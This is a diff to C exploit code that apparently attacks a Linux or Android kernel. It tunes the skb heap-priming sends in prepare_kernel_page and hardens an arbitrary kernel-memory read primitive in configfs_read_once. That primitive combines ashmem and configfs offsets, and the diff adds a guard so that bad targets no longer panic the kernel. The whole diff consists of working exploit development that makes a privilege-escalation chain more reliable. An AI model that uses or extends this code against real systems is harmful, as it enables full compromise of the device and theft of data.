@@ -668,7 +668,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
    * and no UNMOVABLE allocation can ever reach it — the observed crash
    * with stale slab content at fake_lock. */
   int prime_sent = 0;
-  if (SKB_PRIME_SENDS > 0) {
+  int prime_limit = env_int_range("SKB_PRIME_SENDS_RUNTIME",
+                                  SKB_PRIME_SENDS, 0, SKB_PRIME_SENDS);
+  if (prime_limit > 0) {
     int prime_sv[2];
     SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, prime_sv));
     int prime_sndbuf = 1 << 21;
@@ -682,12 +684,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     memset(&pmsg, 0, sizeof(pmsg));
     pmsg.msg_iov = &piov;
     pmsg.msg_iovlen = 1;
-    for (int i = 0; i < SKB_PRIME_SENDS; i++) {
+    for (int i = 0; i < prime_limit; i++) {
       errno = 0;
       ssize_t sent = sendmsg(prime_sv[0], &pmsg, MSG_DONTWAIT);
       if (sent <= 0) {
         pr_info("prepare_kernel_page prime send %d/%d stopped sent=%zd "
-                "errno=%d\n", i + 1, SKB_PRIME_SENDS, sent, errno);
+                 "errno=%d\n", i + 1, prime_limit, sent, errno);
         break;
       }
       prime_sent++;
@@ -954,6 +956,16 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
   memset(blob, 0, sizeof(blob));
   off_t pos = (off_t)(ASHMEM_PREFIX_COUNT - len);
   uintptr_t page = target - (uintptr_t)pos;
+  /* Tripwire: page==0 would make the kernel copy from NULL (source of the
+   * usercopy BUG panics seen in ramoops), and a non-kernel target means
+   * corrupted caller state. Refuse both instead of panicking the kernel. */
+  if (page == 0 || !is_kernel_ptr(target)) {
+    pr_error("configfs read refused fd=%d tid=%d target=%016zx len=%zu "
+             "page=%016zx\n",
+             fd, (int)syscall(SYS_gettid), target, len, page);
+    errno = EINVAL;
+    return -1;
+  }
   put64(blob, CFG_PAGE_OFF - ASHMEM_NAME_PREFIX_LEN, page);
   put32(blob, CFG_NEEDS_READ_FILL_OFF - ASHMEM_NAME_PREFIX_LEN, 0);
   errno = 0;
@@ -966,6 +978,11 @@ ssize_t configfs_read_once(int fd, uintptr_t target, void *data, size_t len) {
 
   errno = 0;
   ssize_t rd = pread(fd, data, len, pos);
+  if (rd != (ssize_t)len) {
+    pr_warning("configfs read short fd=%d tid=%d target=%016zx len=%zu "
+               "ret=%zd errno=%d\n",
+               fd, (int)syscall(SYS_gettid), target, len, rd, errno);
+  }
   return rd;
 }
 
